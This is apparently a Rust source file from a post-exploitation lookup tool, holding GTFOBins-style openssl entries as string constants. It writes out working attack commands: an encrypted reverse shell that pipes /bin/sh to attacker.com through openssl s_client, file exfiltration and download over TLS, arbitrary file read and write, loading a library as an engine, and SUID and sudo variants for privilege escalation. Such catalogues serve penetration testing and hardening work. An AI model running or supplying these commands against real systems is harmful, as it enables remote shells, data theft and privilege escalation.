pub static BIN_NAME: &'static str = "openssl";
pub static RS_DESC_1: &'static str = "To receive the shell run the following on the attacker box:";
pub static RS_CODE_1: &'static str = r#"
    
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
"#;
pub static RS_DESC_2: &'static str = "Communication between attacker and target will be encrypted.";
pub static RS_CODE_2: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
"#;
pub static FU_DESC_1: &'static str = "To collect the file run the following on the attacker box:";
pub static FU_CODE_1: &'static str = r#"
    
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
"#;
pub static FU_DESC_2: &'static str = "Send a local file via TCP. Transmission will be encrypted.";
pub static FU_CODE_2: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
"#;
pub static FD_DESC_1: &'static str = "To send the file run the following on the attacker box:";
pub static FD_CODE_1: &'static str = r#"
    
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send
"#;
pub static FD_DESC_2: &'static str =
    "Fetch a file from a TCP port, transmission will be encrypted.";
pub static FD_CODE_2: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_save
    openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
"#;
pub static FW_CODE_1: &'static str = r#"
    
    LFILE=file_to_write
    echo DATA | openssl enc -out "$LFILE"
"#;
pub static FW_CODE_2: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo "DATA" > $TF
    openssl enc -in "$TF" -out "$LFILE"
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    openssl enc -in "$LFILE"
"#;
pub static LL_CODE: &'static str = r#"
    
    openssl req -engine ./lib.so
"#;
pub static SUID_DESC_1: &'static str =
    "To receive the shell run the following on the attacker box:";
pub static SUID_CODE_1: &'static str = r#"
    
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
"#;
pub static SUID_DESC_2: &'static str =
    "Communication between attacker and target will be encrypted.";
pub static SUID_CODE_2: &'static str = r#"
    
    sudo install -m =xs $(which openssl) .

    RHOST=attacker.com
    RPORT=12345
    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
"#;
pub static SUID_CODE_3: &'static str = r#"
    
    sudo install -m =xs $(which openssl) .

    LFILE=file_to_write
    echo DATA | openssl enc -out "$LFILE"
"#;
pub static SUDO_DESC_1: &'static str =
    "To receive the shell run the following on the attacker box.";
pub static SUDO_CODE_1: &'static str = r#"
    
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
"#;
pub static SUDO_DESC_2: &'static str =
    "Communication between attacker and target will be encrypted.";
pub static SUDO_CODE_2: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
"#;
use crate::code::{Code, Tag};
pub static RS_1: Code<'static> = Code {
    title: "RS_CODE_1",
    code: RS_CODE_1,
    tag: Tag::RS,
};
pub static RS_2: Code<'static> = Code {
    title: "RS_CODE_2",
    code: RS_CODE_2,
    tag: Tag::RS,
};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FD_1: Code<'static> = Code {
    title: "FD_CODE_1",
    code: FD_CODE_1,
    tag: Tag::FD,
};
pub static FD_2: Code<'static> = Code {
    title: "FD_CODE_2",
    code: FD_CODE_2,
    tag: Tag::FD,
};
pub static FW_1: Code<'static> = Code {
    title: "FW_CODE_1",
    code: FW_CODE_1,
    tag: Tag::FW,
};
pub static FW_2: Code<'static> = Code {
    title: "FW_CODE_2",
    code: FW_CODE_2,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static LL: Code<'static> = Code {
    title: "LL_CODE",
    code: LL_CODE,
    tag: Tag::LL,
};
pub static SUID_1: Code<'static> = Code {
    title: "SUID_CODE_1",
    code: SUID_CODE_1,
    tag: Tag::SUID,
};
pub static SUID_2: Code<'static> = Code {
    title: "SUID_CODE_2",
    code: SUID_CODE_2,
    tag: Tag::SUID,
};
pub static SUID_3: Code<'static> = Code {
    title: "SUID_CODE_3",
    code: SUID_CODE_3,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
